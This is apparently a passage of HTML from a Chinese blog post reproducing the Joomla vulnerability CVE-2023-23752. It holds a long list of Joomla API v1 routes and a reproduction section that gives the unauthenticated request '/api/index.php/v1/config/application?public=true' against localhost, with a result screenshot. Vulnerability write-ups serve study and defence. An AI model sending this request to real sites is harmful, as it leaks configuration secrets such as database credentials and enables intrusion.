class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br></pre></td><td class="code"><pre><span class="line">v1/banners</span><br><span class="line">v1/banners/:id</span><br><span class="line">v1/banners</span><br><span class="line">v1/banners/:id</span><br><span class="line">v1/banners/:id</span><br><span class="line">v1/banners/clients</span><br><span class="line">v1/banners/clients/:id</span><br><span class="line">v1/banners/clients</span><br><span class="line">v1/banners/clients/:id</span><br><span class="line">v1/banners/clients/:id</span><br><span class="line">v1/banners/categories</span><br><span class="line">v1/banners/categories/:id</span><br><span class="line">v1/banners/categories</span><br><span class="line">v1/banners/categories/:id</span><br><span class="line">v1/banners/categories/:id</span><br><span class="line">v1/banners/:id/contenthistory</span><br><span class="line">v1/banners/:id/contenthistory/keep</span><br><span class="line">v1/banners/:id/contenthistory</span><br><span class="line">v1/config/application</span><br><span class="line">v1/config/application</span><br><span class="line">v1/config/:component_name</span><br><span class="line">v1/config/:component_name</span><br><span class="line">v1/contacts/form/:id</span><br><span class="line">v1/contacts</span><br><span class="line">v1/contacts/:id</span><br><span class="line">v1/contacts</span><br><span class="line">v1/contacts/:id</span><br><span class="line">v1/contacts/:id</span><br><span class="line">v1/contacts/categories</span><br><span class="line">v1/contacts/categories/:id</span><br><span class="line">v1/contacts/categories</span><br><span class="line">v1/contacts/categories/:id</span><br><span class="line">v1/contacts/categories/:id</span><br><span class="line">v1/fields/contacts/contact</span><br><span class="line">v1/fields/contacts/contact/:id</span><br><span class="line">v1/fields/contacts/contact</span><br><span class="line">v1/fields/contacts/contact/:id</span><br><span class="line">v1/fields/contacts/contact/:id</span><br><span class="line">v1/fields/contacts/mail</span><br><span class="line">v1/fields/contacts/mail/:id</span><br><span class="line">v1/fields/contacts/mail</span><br><span class="line">v1/fields/contacts/mail/:id</span><br><span class="line">v1/fields/contacts/mail/:id</span><br><span class="line">v1/fields/contacts/categories</span><br><span class="line">v1/fields/contacts/categories/:id</span><br><span class="line">v1/fields/contacts/categories</span><br><span class="line">v1/fields/contacts/categories/:id</span><br><span class="line">v1/fields/contacts/categories/:id</span><br><span class="line">v1/fields/groups/contacts/contact</span><br><span class="line">v1/fields/groups/contacts/contact/:id</span><br><span class="line">v1/fields/groups/contacts/contact</span><br><span class="line">v1/fields/groups/contacts/contact/:id</span><br><span class="line">v1/fields/groups/contacts/contact/:id</span><br><span class="line">v1/fields/groups/contacts/mail</span><br><span class="line">v1/fields/groups/contacts/mail/:id</span><br><span class="line">v1/fields/groups/contacts/mail</span><br><span class="line">v1/fields/groups/contacts/mail/:id</span><br><span class="line">v1/fields/groups/contacts/mail/:id</span><br><span class="line">v1/fields/groups/contacts/categories</span><br><span class="line">v1/fields/groups/contacts/categories/:id</span><br><span class="line">v1/fields/groups/contacts/categories</span><br><span class="line">v1/fields/groups/contacts/categories/:id</span><br><span class="line">v1/fields/groups/contacts/categories/:id</span><br><span class="line">v1/contacts/:id/contenthistory</span><br><span class="line">v1/contacts/:id/contenthistory/keep</span><br><span class="line">v1/contacts/:id/contenthistory</span><br><span class="line">v1/content/articles</span><br><span class="line">v1/content/articles/:id</span><br><span class="line">v1/content/articles</span><br><span class="line">v1/content/articles/:id</span><br><span class="line">v1/content/articles/:id</span><br><span class="line">v1/content/categories</span><br><span class="line">v1/content/categories/:id</span><br><span class="line">v1/content/categories</span><br><span class="line">v1/content/categories/:id</span><br><span class="line">v1/content/categories/:id</span><br><span class="line">v1/fields/content/articles</span><br><span class="line">v1/fields/content/articles/:id</span><br><span class="line">v1/fields/content/articles</span><br><span class="line">v1/fields/content/articles/:id</span><br><span class="line">v1/fields/content/articles/:id</span><br><span class="line">v1/fields/content/categories</span><br><span class="line">v1/fields/content/categories/:id</span><br><span class="line">v1/fields/content/categories</span><br><span class="line">v1/fields/content/categories/:id</span><br><span class="line">v1/fields/content/categories/:id</span><br><span class="line">v1/fields/groups/content/articles</span><br><span class="line">v1/fields/groups/content/articles/:id</span><br><span class="line">v1/fields/groups/content/articles</span><br><span class="line">v1/fields/groups/content/articles/:id</span><br><span class="line">v1/fields/groups/content/articles/:id</span><br><span class="line">v1/fields/groups/content/categories</span><br><span class="line">v1/fields/groups/content/categories/:id</span><br><span class="line">v1/fields/groups/content/categories</span><br><span class="line">v1/fields/groups/content/categories/:id</span><br><span class="line">v1/fields/groups/content/categories/:id</span><br><span class="line">v1/content/articles/:id/contenthistory</span><br><span class="line">v1/content/articles/:id/contenthistory/keep</span><br><span class="line">v1/content/articles/:id/contenthistory</span><br><span class="line">v1/extensions</span><br><span class="line">v1/languages/content</span><br><span class="line">v1/languages/content/:id</span><br><span class="line">v1/languages/content</span><br><span class="line">v1/languages/content/:id</span><br><span class="line">v1/languages/content/:id</span><br><span class="line">v1/languages/overrides/search</span><br><span class="line">v1/languages/overrides/search/cache/refresh</span><br><span class="line">v1/languages/overrides/site/zh-CN</span><br><span class="line">v1/languages/overrides/site/zh-CN/:id</span><br><span class="line">v1/languages/overrides/site/zh-CN</span><br><span class="line">v1/languages/overrides/site/zh-CN/:id</span><br><span class="line">v1/languages/overrides/site/zh-CN/:id</span><br><span class="line">v1/languages/overrides/administrator/zh-CN</span><br><span class="line">v1/languages/overrides/administrator/zh-CN/:id</span><br><span class="line">v1/languages/overrides/administrator/zh-CN</span><br><span class="line">v1/languages/overrides/administrator/zh-CN/:id</span><br><span class="line">v1/languages/overrides/administrator/zh-CN/:id</span><br><span class="line">v1/languages/overrides/site/en-GB</span><br><span class="line">v1/languages/overrides/site/en-GB/:id</span><br><span class="line">v1/languages/overrides/site/en-GB</span><br><span class="line">v1/languages/overrides/site/en-GB/:id</span><br><span class="line">v1/languages/overrides/site/en-GB/:id</span><br><span class="line">v1/languages/overrides/administrator/en-GB</span><br><span class="line">v1/languages/overrides/administrator/en-GB/:id</span><br><span class="line">v1/languages/overrides/administrator/en-GB</span><br><span class="line">v1/languages/overrides/administrator/en-GB/:id</span><br><span class="line">v1/languages/overrides/administrator/en-GB/:id</span><br><span class="line">v1/languages</span><br><span class="line">v1/languages</span><br><span class="line">v1/media/adapters</span><br><span class="line">v1/media/adapters/:id</span><br><span class="line">v1/media/files</span><br><span class="line">v1/media/files/:path/</span><br><span class="line">v1/media/files/:path</span><br><span class="line">v1/media/files</span><br><span class="line">v1/media/files/:path</span><br><span class="line">v1/media/files/:path</span><br><span class="line">v1/menus/site</span><br><span class="line">v1/menus/site/:id</span><br><span class="line">v1/menus/site</span><br><span class="line">v1/menus/site/:id</span><br><span class="line">v1/menus/site/:id</span><br><span class="line">v1/menus/administrator</span><br><span class="line">v1/menus/administrator/:id</span><br><span class="line">v1/menus/administrator</span><br><span class="line">v1/menus/administrator/:id</span><br><span class="line">v1/menus/administrator/:id</span><br><span class="line">v1/menus/site/items</span><br><span class="line">v1/menus/site/items/:id</span><br><span class="line">v1/menus/site/items</span><br><span class="line">v1/menus/site/items/:id</span><br><span class="line">v1/menus/site/items/:id</span><br><span class="line">v1/menus/administrator/items</span><br><span class="line">v1/menus/administrator/items/:id</span><br><span class="line">v1/menus/administrator/items</span><br><span class="line">v1/menus/administrator/items/:id</span><br><span class="line">v1/menus/administrator/items/:id</span><br><span class="line">v1/menus/site/items/types</span><br><span class="line">v1/menus/administrator/items/types</span><br><span class="line">v1/messages</span><br><span class="line">v1/messages/:id</span><br><span class="line">v1/messages</span><br><span class="line">v1/messages/:id</span><br><span class="line">v1/messages/:id</span><br><span class="line">v1/modules/types/site</span><br><span class="line">v1/modules/types/administrator</span><br><span class="line">v1/modules/site</span><br><span class="line">v1/modules/site/:id</span><br><span class="line">v1/modules/site</span><br><span class="line">v1/modules/site/:id</span><br><span class="line">v1/modules/site/:id</span><br><span class="line">v1/modules/administrator</span><br><span class="line">v1/modules/administrator/:id</span><br><span class="line">v1/modules/administrator</span><br><span class="line">v1/modules/administrator/:id</span><br><span class="line">v1/modules/administrator/:id</span><br><span class="line">v1/newsfeeds/feeds</span><br><span class="line">v1/newsfeeds/feeds/:id</span><br><span class="line">v1/newsfeeds/feeds</span><br><span class="line">v1/newsfeeds/feeds/:id</span><br><span class="line">v1/newsfeeds/feeds/:id</span><br><span class="line">v1/newsfeeds/categories</span><br><span class="line">v1/newsfeeds/categories/:id</span><br><span class="line">v1/newsfeeds/categories</span><br><span class="line">v1/newsfeeds/categories/:id</span><br><span class="line">v1/newsfeeds/categories/:id</span><br><span class="line">v1/plugins</span><br><span class="line">v1/plugins/:id</span><br><span class="line">v1/plugins/:id</span><br><span class="line">v1/privacy/requests</span><br><span class="line">v1/privacy/requests/:id</span><br><span class="line">v1/privacy/requests/export/:id</span><br><span class="line">v1/privacy/requests</span><br><span class="line">v1/privacy/consents</span><br><span class="line">v1/privacy/consents/:id</span><br><span class="line">v1/privacy/consents/:id</span><br><span class="line">v1/redirects</span><br><span class="line">v1/redirects/:id</span><br><span class="line">v1/redirects</span><br><span class="line">v1/redirects/:id</span><br><span class="line">v1/redirects/:id</span><br><span class="line">v1/tags</span><br><span class="line">v1/tags/:id</span><br><span class="line">v1/tags</span><br><span class="line">v1/tags/:id</span><br><span class="line">v1/tags/:id</span><br><span class="line">v1/templates/styles/site</span><br><span class="line">v1/templates/styles/site/:id</span><br><span class="line">v1/templates/styles/site</span><br><span class="line">v1/templates/styles/site/:id</span><br><span class="line">v1/templates/styles/site/:id</span><br><span class="line">v1/templates/styles/administrator</span><br><span class="line">v1/templates/styles/administrator/:id</span><br><span class="line">v1/templates/styles/administrator</span><br><span class="line">v1/templates/styles/administrator/:id</span><br><span class="line">v1/templates/styles/administrator/:id</span><br><span class="line">v1/users</span><br><span class="line">v1/users/:id</span><br><span class="line">v1/users</span><br><span class="line">v1/users/:id</span><br><span class="line">v1/users/:id</span><br><span class="line">v1/fields/users</span><br><span class="line">v1/fields/users/:id</span><br><span class="line">v1/fields/users</span><br><span class="line">v1/fields/users/:id</span><br><span class="line">v1/fields/users/:id</span><br><span class="line">v1/fields/groups/users</span><br><span class="line">v1/fields/groups/users/:id</span><br><span class="line">v1/fields/groups/users</span><br><span class="line">v1/fields/groups/users/:id</span><br><span class="line">v1/fields/groups/users/:id</span><br><span class="line">v1/users/groups</span><br><span class="line">v1/users/groups/:id</span><br><span class="line">v1/users/groups</span><br><span class="line">v1/users/groups/:id</span><br><span class="line">v1/users/groups/:id</span><br><span class="line">v1/users/levels</span><br><span class="line">v1/users/levels/:id</span><br><span class="line">v1/users/levels</span><br><span class="line">v1/users/levels/:id</span><br><span class="line">v1/users/levels/:id</span><br></pre></td></tr></table></figure>
-
-<h2><span id="复现">复现</span></h2><h3><span id="发送请求">发送请求</span></h3><blockquote>
-<p><code>http://127.0.0.1/api/index.php/v1/config/application?public=true</code></p>
-</blockquote>
-<h3><span id="效果">效果</span></h3><blockquote>
-<p><img src="/2023/11/08/CVE-2023-23752-Joomla/10.png" alt="image"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Joomla/" rel="tag">Joomla</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
             </div>
         
 
